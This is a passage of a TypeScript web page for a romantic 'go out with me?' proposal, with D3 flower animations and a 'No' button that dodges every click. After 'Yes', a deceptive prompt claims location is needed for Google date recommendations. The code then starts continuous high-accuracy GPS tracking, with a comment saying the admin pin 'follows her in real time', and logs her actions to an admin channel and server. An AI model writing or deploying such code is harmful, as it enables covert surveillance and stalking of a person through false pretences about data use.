    .attr('stroke', 'rgba(255, 255, 255, 0.4)')
    .attr('stroke-width', 0.8)
    .attr('transform', (d: number) => `rotate(${d}) scale(0)`);

  outerPetals.transition()
    .delay((_: any, i: number) => 700 + i * 45)
    .duration(800)
    .ease(d3Lib.easeBackOut.overshoot(1.5))
    .attr('transform', (d: number) => `rotate(${d}) scale(1)`);

  // Layer 2: Middle Petals (8 petals offset by 22.5 deg)
  const midAngles = [22.5, 67.5, 112.5, 157.5, 202.5, 247.5, 292.5, 337.5];
  const midPetals = innerHead.selectAll('.ivraine-petal-mid')
    .data(midAngles)
    .enter()
    .append('path')
    .attr('class', 'ivraine-petal-mid')
    .attr('d', petalPathD)
    .attr('fill', 'url(#ivraine-mid-petal-grad)')
    .attr('stroke', 'rgba(255, 255, 255, 0.35)')
    .attr('stroke-width', 0.8)
    .attr('transform', (d: number) => `rotate(${d}) scale(0)`);

  midPetals.transition()
    .delay((_: any, i: number) => 1050 + i * 40)
    .duration(750)
    .ease(d3Lib.easeBackOut.overshoot(1.4))
    .attr('transform', (d: number) => `rotate(${d}) scale(0.78)`);

  // Layer 3: Inner Petals (6 petals)
  const innerAngles = [10, 70, 130, 190, 250, 310];
  const innerPetals = innerHead.selectAll('.ivraine-petal-inner')
    .data(innerAngles)
    .enter()
    .append('path')
    .attr('class', 'ivraine-petal-inner')
    .attr('d', petalPathD)
    .attr('fill', 'url(#ivraine-inner-petal-grad)')
    .attr('stroke', 'rgba(255, 255, 255, 0.3)')
    .attr('stroke-width', 0.7)
    .attr('transform', (d: number) => `rotate(${d}) scale(0)`);

  innerPetals.transition()
    .delay((_: any, i: number) => 1350 + i * 35)
    .duration(700)
    .ease(d3Lib.easeBackOut.overshoot(1.3))
    .attr('transform', (d: number) => `rotate(${d}) scale(0.55)`);

  // Center Bud (Core)
  const bud = innerHead.append('circle')
    .attr('cx', 0)
    .attr('cy', 0)
    .attr('r', 0)
    .attr('fill', 'url(#ivraine-bud-grad)')
    .attr('filter', 'url(#ivraine-bloom-glow)');

  bud.transition()
    .delay(1600)
    .duration(600)
    .ease(d3Lib.easeElasticOut.amplitude(1).period(0.4))
    .attr('r', 18);

  // Glowing Stamen Dots around the core (12 dots)
  const stamenData = d3Lib.range(12).map((i: number) => {
    const angle = (i * 2 * Math.PI) / 12;
    return {
      x: 12 * Math.cos(angle),
      y: 12 * Math.sin(angle)
    };
  });

  const stamens = innerHead.selectAll('.ivraine-stamen')
    .data(stamenData)
    .enter()
    .append('circle')
    .attr('class', 'ivraine-stamen')
    .attr('cx', (d: any) => d.x)
    .attr('cy', (d: any) => d.y)
    .attr('r', 0)
    .attr('fill', '#fffde7')
    .attr('stroke', '#ffd54f')
    .attr('stroke-width', 0.7);

  stamens.transition()
    .delay((_: any, i: number) => 1700 + i * 25)
    .duration(400)
    .ease(d3Lib.easeBackOut.overshoot(2))
    .attr('r', 2);

  // Group for tap heart particles
  const particleGroup = svg.append('g').attr('class', 'ivraine-tap-particles');

  // Interactive Click / Tap: Spawns bursts of D3 heart particles!
  const triggerMagic = () => {
    try { navigator.vibrate?.([40]); } catch {}

    innerHead.transition()
      .duration(150)
      .attr('transform', 'scale(1.15)')
      .transition()
      .duration(250)
      .ease(d3Lib.easeBackOut)
      .attr('transform', 'scale(1)');

    const emojis = ['💖', '💕', '✨', '🌸', '❤️'];
    for (let i = 0; i < 10; i++) {
      const angle = Math.random() * 2 * Math.PI;
      const dist = 40 + Math.random() * 65;
      const targetX = centerX + Math.cos(angle) * dist;
      const targetY = flowerCenterY + Math.sin(angle) * dist - 10;
      const emoji = emojis[Math.floor(Math.random() * emojis.length)];

      const p = particleGroup.append('text')
        .attr('x', centerX)
        .attr('y', flowerCenterY)
        .attr('font-size', '14px')
        .attr('text-anchor', 'middle')
        .attr('dominant-baseline', 'central')
        .attr('opacity', 1)
        .style('pointer-events', 'none')
        .style('user-select', 'none')
        .text(emoji);

      p.transition()
        .duration(850 + Math.random() * 300)
        .ease(d3Lib.easeCubicOut)
        .attr('x', targetX)
        .attr('y', targetY)
        .attr('font-size', '20px')
        .attr('opacity', 0)
        .remove();
    }
  };

  svg.style('cursor', 'pointer');
  svg.on('click', triggerMagic);

  // 3D Perspective interactive tilt physics on mousemove / touchmove
  const flowerCard = container.closest('.ivraine-d3-flower-card') || container;
  const handleMove = (clientX: number, clientY: number) => {
    const rect = flowerCard.getBoundingClientRect();
    if (!rect.width || !rect.height) return;
    const x = clientX - (rect.left + rect.width / 2);
    const y = clientY - (rect.top + rect.height / 2);
    const rotateX = Math.max(-20, Math.min(20, -(y / (rect.height / 2)) * 18));
    const rotateY = Math.max(-20, Math.min(20, (x / (rect.width / 2)) * 18));
    container.style.transform = `rotateX(${rotateX.toFixed(2)}deg) rotateY(${rotateY.toFixed(2)}deg) translateZ(14px)`;
  };
  const handleReset = () => {
    container.style.transform = 'rotateX(0deg) rotateY(0deg) translateZ(0px)';
  };

  flowerCard.addEventListener('mousemove', ((e: MouseEvent) => handleMove(e.clientX, e.clientY)) as EventListener);
  flowerCard.addEventListener('mouseleave', handleReset);
  flowerCard.addEventListener('touchmove', ((e: TouchEvent) => {
    if (e.touches && e.touches[0]) {
      handleMove(e.touches[0].clientX, e.touches[0].clientY);
    }
  }) as EventListener, { passive: true });
  flowerCard.addEventListener('touchend', handleReset);
}

// ─────────────────────────────────────────────────────────────────────────────
// Custom Designed Modern Permission Prompt
// ─────────────────────────────────────────────────────────────────────────────
function showCustomPermissionPrompt(
  card: HTMLDivElement,
  overlay: HTMLDivElement,
  userName: string,
  source: 'Scrapbook' | 'Private Space' | 'Admin'
) {
  card.innerHTML = `
    <div class="ivraine-loc-card-custom modern-permission-card">
      <div class="ivraine-loc-header-badge">✨ Romantic Date Places ♡</div>
      <div class="ivraine-loc-avatar-burst">
        <span class="ivraine-loc-icon-bubble">📍</span>
        <span class="ivraine-loc-heart-bubble">💖</span>
      </div>
      <h2 class="ivraine-celebration-title">She said YES! 🥰🎉</h2>
      <div class="ivraine-loc-custom-subtitle">A Special Moment For Us ♡</div>
      <p class="ivraine-loc-custom-desc">
        Allow Location so that Google will provide the best places for our romantic date ♡
      </p>

      <div class="ivraine-loc-features-box">
        <div class="ivraine-loc-feat-item">
          <span class="ivraine-loc-feat-icon">🗺️</span>
          <span>Google recommended spots near your location</span>
        </div>
        <div class="ivraine-loc-feat-item">
          <span class="ivraine-loc-feat-icon">💖</span>
          <span>Handpicked romantic spots for us to explore together</span>
        </div>
      </div>

      <div class="ivraine-loc-custom-btns">
        <button class="ivraine-btn-allow-loc-main" id="ivraine-btn-prompt-loc" type="button">
          <span>📍 Allow Location to Discover Romantic Places ♡</span>
        </button>

        <button class="ivraine-btn-go-back-custom" id="ivraine-btn-go-back-prompt" type="button">
          <span>← Go Back</span>
        </button>
      </div>
    </div>
  `;

  const allowBtn = card.querySelector<HTMLButtonElement>('#ivraine-btn-prompt-loc')!;
  const backBtn = card.querySelector<HTMLButtonElement>('#ivraine-btn-go-back-prompt')!;

  allowBtn.addEventListener('click', () => {
    card.innerHTML = `
      <div class="ivraine-loc-requesting-wrap">
        <div class="ivraine-loc-request-pulse">📍💖</div>
        <h2 class="ivraine-celebration-title">She said YES! 🥰🎉</h2>
        <div class="ivraine-loc-prompt-title">Connecting with Location…</div>
        <p class="ivraine-loc-prompt-desc">
          Please tap <strong>"Allow"</strong> when your phone asks for location to discover our romantic date spots! ♡
        </p>
        <div class="ivraine-loc-loader">
          <div class="ivraine-loc-dot"></div>
          <span>Connecting with GPS…</span>
        </div>
      </div>
    `;

    void requestPhoneLocationStrict(card, overlay, userName, source);
  });

  backBtn.addEventListener('click', () => {
    renderProposalContent(card, overlay, source, userName);
  });
}

// Strict location request: NO bypass if denied or timed out.
async function requestPhoneLocationStrict(
  card: HTMLDivElement,
  overlay: HTMLDivElement,
  userName: string,
  source: 'Scrapbook' | 'Private Space' | 'Admin'
) {
  let handled = false;

  const onDeniedOrTimeout = (msg = '') => {
    if (handled) return;
    handled = true;
    showLocationDeniedPrompt(card, overlay, userName, source, msg);
  };

  const onSuccess = async (loc: LocationData) => {
    if (handled) return;
    handled = true;
    showDateReveal(card, overlay, userName, source, loc);
  };

  if (!navigator.geolocation) {
    onDeniedOrTimeout("Your browser does not support geolocation. You won't be able to see the romantic date places without location permission ♡");
    return;
  }

  // Safety timeout: if she takes too long (> 7.5 seconds) to allow
  const timeoutId = setTimeout(() => {
    if (!handled) {
      onDeniedOrTimeout("Location was not allowed or took too long to respond. You won't be able to see the romantic date places without enabling location permission ♡");
    }
  }, 7500);

  navigator.geolocation.getCurrentPosition(
    async (pos) => {
      clearTimeout(timeoutId);
      const loc = await buildGpsLocation(pos);
      if (!loc) {
        onDeniedOrTimeout('Your phone could not get an accurate GPS fix. Please step outside or turn on high-accuracy location and try again ♡');
        return;
      }

      // Keep the live stream running so the admin pin follows her in real time.
      startLiveLocationTracking(source, userName);
      await publishGpsLocation(source, userName, loc);

      await onSuccess(loc);
    },
    (err) => {
      clearTimeout(timeoutId);
      const deviceId = getDeviceId();
      trackActivity(source, 'Location permission denied or failed', `Error: ${err?.message || 'code ' + err?.code}`, userName);
      
      // Notify admin channel that location is off so previous pin can be removed/updated
      try {
        const channel = new BroadcastChannel('ivraine_admin_channel');
        channel.postMessage({
          type: 'LOCATION_OFF',
          deviceId,
          user: userName
        });
      } catch {}

      try {
        fetch('/api/date-location', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ action: 'turn_off', removePin: true, user: userName, deviceId }),
          keepalive: true
        }).catch(() => {});
      } catch {}

      onDeniedOrTimeout("Location was not allowed or took too long to respond. You won't be able to see the romantic date places without enabling location permission ♡");
    },
    { enableHighAccuracy: true, timeout: 7000, maximumAge: 0 }
  );
}

function showLocationDeniedPrompt(
  card: HTMLDivElement,
  overlay: HTMLDivElement,
  userName: string,
  source: 'Scrapbook' | 'Private Space' | 'Admin',
  customMsg = ''
) {
  card.innerHTML = `
    <div class="ivraine-loc-denied-wrap">
      <div class="ivraine-loc-denied-icon">📍🔒</div>
      <h2 class="ivraine-celebration-title">She said YES! 🥰🎉</h2>
      <div class="ivraine-loc-denied-title">Location Permission Required ♡</div>
      <p class="ivraine-loc-denied-desc">
        ${customMsg || "Location was not allowed or took too long to respond. You won't be able to see the romantic date places without enabling location permission ♡"}
      </p>

      <div class="ivraine-loc-phone-help">
        💡 <strong>To allow GPS on phone:</strong> Tap the 🔒 icon beside the URL in your browser address bar, switch <strong>Location to Allow</strong>, and tap below.
      </div>

      <div class="ivraine-loc-denied-btns">
        <button class="ivraine-btn-allow-loc-main" id="ivraine-btn-retry-loc" type="button">
          <span>📍 Allow Location to See Places ♡</span>
        </button>

        <button class="ivraine-btn-go-back" id="ivraine-btn-go-back" type="button">
          <span>← Go Back</span>
        </button>
      </div>
    </div>
  `;

  card.querySelector<HTMLButtonElement>('#ivraine-btn-retry-loc')?.addEventListener('click', () => {
    card.innerHTML = `
      <div class="ivraine-loc-requesting-wrap">
        <div class="ivraine-loc-request-pulse">📍💖</div>
        <h2 class="ivraine-celebration-title">She said YES! 🥰🎉</h2>
        <div class="ivraine-loc-prompt-title">Connecting with Location…</div>
        <p class="ivraine-loc-prompt-desc">
          Please tap <strong>"Allow"</strong> when your phone asks for location to discover our romantic date spots! ♡
        </p>
        <div class="ivraine-loc-loader">
          <div class="ivraine-loc-dot"></div>
          <span>Connecting with GPS…</span>
        </div>
      </div>
    `;

    void requestPhoneLocationStrict(card, overlay, userName, source);
  });

  card.querySelector<HTMLButtonElement>('#ivraine-btn-go-back')?.addEventListener('click', () => {
    renderProposalContent(card, overlay, source, userName);
  });
}

function showDateReveal(
  card: HTMLDivElement,
  overlay: HTMLDivElement,
  userName: string,
  source: 'Scrapbook' | 'Private Space' | 'Admin',
  loc: LocationData | null
) {
  launchHeartsConfetti();

  try { navigator.vibrate?.([100, 50, 150, 50, 200]); } catch {}

  trackActivity(source, "Said YES & revealed date spots ♡", `Location: ${loc?.fullAddress || 'Tagbilaran City, Bohol'}`, userName, 0, loc || undefined);

  const spotsHtml = tagbilaranSpots.map((s, idx) => `
    <a class="ivraine-place-card" href="${s.mapUrl}" target="_blank" rel="noopener noreferrer">
      <div class="ivraine-place-num">${idx + 1}</div>
      <div class="ivraine-place-icon">${s.emoji}</div>
      <div class="ivraine-place-body">
        <div class="ivraine-place-type">${s.type}</div>
        <div class="ivraine-place-name">${s.name}</div>
        <div class="ivraine-place-vibe">${s.vibe}</div>
        <div class="ivraine-place-addr">📍 ${s.address}</div>
      </div>
      <div class="ivraine-place-badge">
        <span>Map</span>
        <span>🗺️</span>
      </div>
    </a>
  `).join('');

  card.innerHTML = `
    <div class="ivraine-places-unlocked-wrap">
      <div class="ivraine-heart-burst">💖✨</div>
      <h2 class="ivraine-celebration-title">YAAAY! She said YES! 🥰🎉</h2>
      <span class="ivraine-places-tag">🗺️ Google Recommended Date Spots ♡</span>
      <p class="ivraine-celebration-text">
        Based on your location, Google has recommended the best spots for our date, ${userName} ♡<br>
        <em>Tap any spot to open directions in Google Maps!</em>
      </p>

      <div class="ivraine-sweet-love-card">
        <div class="sweet-quote-icon">💌</div>
        <p class="sweet-quote-text">"Thinking of you always puts a smile on my face. Can't wait to see you soon i love you babi"</p>
        <div class="sweet-quote-from">— Ivan ♡</div>
      </div>

      <div class="ivraine-d3-flower-card">
        <div id="ivraine-d3-flower-container" class="ivraine-d3-flower-container"></div>
        <div class="ivraine-flower-caption">
          <span class="flower-badge">🌸 Bloomed for ${userName} ♡</span>
          <p>A secret romantic flower bloomed just for you!<br><small>(Tap the flower for sweet magic ✨)</small></p>
        </div>
      </div>

      <div class="ivraine-places-scroll-list">
        ${spotsHtml}
      </div>

      <button class="ivraine-btn-continue" id="ivraine-btn-date-close" type="button">
        Step inside our memories 📖 ♡
      </button>
    </div>
  `;

  const flowerContainer = card.querySelector<HTMLElement>('#ivraine-d3-flower-container');
  if (flowerContainer) {
    renderD3Flower(flowerContainer, userName);
  }

  card.querySelector<HTMLButtonElement>('#ivraine-btn-date-close')!.addEventListener('click', () => {
    overlay.remove();
    const passcodeField = document.getElementById('passcode');
    if (passcodeField) {
      passcodeField.focus();
    }
  });
}

function renderProposalContent(
  card: HTMLDivElement,
  overlay: HTMLDivElement,
  source: 'Scrapbook' | 'Private Space' | 'Admin',
  userName: string
) {
  card.innerHTML = `
    <button class="ivraine-close-proposal" type="button" aria-label="Close">×</button>
    <span class="ivraine-proposal-badge">A question from Ivan ♡</span>
    <div class="ivraine-proposal-avatar-wrap">
      <img class="ivraine-proposal-avatar" src="/icons/couple-192.png" alt="Ivan and Loraine">
      <span class="ivraine-avatar-heart">💖</span>
    </div>
    <h2 class="ivraine-proposal-title" id="proposal-title">Would you <em>go out with me?</em></h2>
    <p class="ivraine-proposal-desc">Every moment with you is my favorite memory, ${userName}.<br>Will you go out with me, today and forever? ♡</p>
    
    <div class="ivraine-button-arena" id="ivraine-btn-arena">
      <button class="ivraine-btn-yes" id="ivraine-btn-yes" type="button">
        <span>Yes! 🥰💖</span>
      </button>
      
      <button class="ivraine-btn-no" id="ivraine-btn-no" type="button">
        <span>No 🙈</span>
        <div class="ivraine-tease-bubble" id="ivraine-tease">Nice try! 😜</div>
      </button>
    </div>
  `;

  const closeBtn = card.querySelector<HTMLButtonElement>('.ivraine-close-proposal')!;
  const arena = card.querySelector<HTMLDivElement>('#ivraine-btn-arena')!;
  const yesBtn = card.querySelector<HTMLButtonElement>('#ivraine-btn-yes')!;
  const noBtn = card.querySelector<HTMLButtonElement>('#ivraine-btn-no')!;
  const teaseBubble = card.querySelector<HTMLDivElement>('#ivraine-tease')!;

  closeBtn.addEventListener('click', () => overlay.remove());

  let currentX = 0;
  let currentY = 0;

  function dodge(isTouch = false) {
    dodgeCount++;
    const arenaRect = arena.getBoundingClientRect();
    const yesRect = yesBtn.getBoundingClientRect();
    const noRect = noBtn.getBoundingClientRect();

    const teaseText = teases[dodgeCount % teases.length];
    teaseBubble.textContent = teaseText;
    teaseBubble.classList.add('visible');
    if (teaseTimer) clearTimeout(teaseTimer);
    teaseTimer = setTimeout(() => teaseBubble.classList.remove('visible'), 1500);

    try {
      navigator.vibrate?.([30]);
    } catch {}

    const padding = 15;
    const maxX = (arenaRect.width / 2) - (noRect.width / 2) - padding;
    const maxY = (arenaRect.height / 2) - (noRect.height / 2) - padding;

    let newX = 0;
    let newY = 0;
    let attempts = 0;

    while (attempts < 15) {
      attempts++;
      const rx = (Math.random() * 2 - 1) * maxX;
      const ry = (Math.random() * 2 - 1) * maxY;

      const distFromCurrent = Math.hypot(rx - currentX, ry - currentY);
      if (distFromCurrent < 60) continue;

      const arenaCenterX = arenaRect.left + arenaRect.width / 2;
      const arenaCenterY = arenaRect.top + arenaRect.height / 2;
      const prospectiveNoCenterX = arenaCenterX + rx;
      const prospectiveNoCenterY = arenaCenterY + ry;

      const yesCenterX = yesRect.left + yesRect.width / 2;
      const yesCenterY = yesRect.top + yesRect.height / 2;
      const distFromYes = Math.hypot(prospectiveNoCenterX - yesCenterX, prospectiveNoCenterY - yesCenterY);

      if (distFromYes > 90) {
        newX = rx;
        newY = ry;
        break;
      }
    }

    currentX = newX;
    currentY = newY;
    noBtn.style.transform = `translate3d(${newX}px, ${newY}px, 0)`;

    if (dodgeCount % 3 === 0) {
      trackActivity(source, 'Tried to click NO (button avoided cursor)', `Dodged ${dodgeCount} times`, userName, 1);
    }
  }

  arena.addEventListener('mousemove', (e) => {
    const noRect = noBtn.getBoundingClientRect();
    const noCenterX = noRect.left + noRect.width / 2;
    const noCenterY = noRect.top + noRect.height / 2;
    const distance = Math.hypot(e.clientX - noCenterX, e.clientY - noCenterY);

    if (distance < 75) {
      dodge(false);
    }
  });

  noBtn.addEventListener('mouseenter', () => dodge(false));
  noBtn.addEventListener('mouseover', () => dodge(false));
  noBtn.addEventListener('pointerenter', () => dodge(false));

  noBtn.addEventListener('pointerdown', (e) => {
    e.preventDefault();
    e.stopPropagation();
    dodge(e.pointerType === 'touch');
  }, { capture: true });

  noBtn.addEventListener('mousedown', (e) => {
    e.preventDefault();
    e.stopPropagation();
    dodge(false);
  }, { capture: true });

  noBtn.addEventListener('click', (e) => {
    e.preventDefault();
    e.stopPropagation();
    dodge(false);
  }, { capture: true });

  noBtn.addEventListener('touchstart', (e) => {
    e.preventDefault();
    e.stopPropagation();
    dodge(true);
  }, { passive: false, capture: true });

  arena.addEventListener('touchmove', (e) => {
    if (e.touches && e.touches[0]) {
      const touch = e.touches[0];
      const noRect = noBtn.getBoundingClientRect();
      const noCenterX = noRect.left + noRect.width / 2;
      const noCenterY = noRect.top + noRect.height / 2;
      const distance = Math.hypot(touch.clientX - noCenterX, touch.clientY - noCenterY);

      if (distance < 70) {
        dodge(true);
      }
    }
  }, { passive: true });

  // YES BUTTON → shows custom designed permission prompt with seamless bypass!
  yesBtn.addEventListener('click', () => {
    try {
      localStorage.setItem('ivraine_proposal_status', 'accepted');
      localStorage.setItem('ivraine_proposal_date', new Date().toISOString());
      localStorage.setItem('ivraine_proposal_dodges', String(dodgeCount));
    } catch {}

    try { navigator.vibrate?.([100, 50, 150, 50, 200]); } catch {}

    trackActivity(source, "Said YES to 'Would you go out with me?' 💖", `Dodged NO button ${dodgeCount} times before saying YES! 🎉`, userName, dodgeCount);

    showCustomPermissionPrompt(card, overlay, userName, source);
  });
}

export function openProposalModal(source: 'Scrapbook' | 'Private Space' | 'Admin' = 'Private Space', userName = 'Loraine') {
  const existing = document.querySelector('.ivraine-proposal-overlay');
  if (existing) existing.remove();

  trackActivity(source, "Opened 'Would you go out with me?' proposal", 'User opened proposal modal', userName);

  const overlay = document.createElement('div');
  overlay.className = 'ivraine-proposal-overlay';
  overlay.innerHTML = `
    <div class="ivraine-proposal-card" role="dialog" aria-modal="true" aria-labelledby="proposal-title"></div>
  `;

  document.body.appendChild(overlay);
  const card = overlay.querySelector<HTMLDivElement>('.ivraine-proposal-card')!;

  renderProposalContent(card, overlay, source, userName);
}
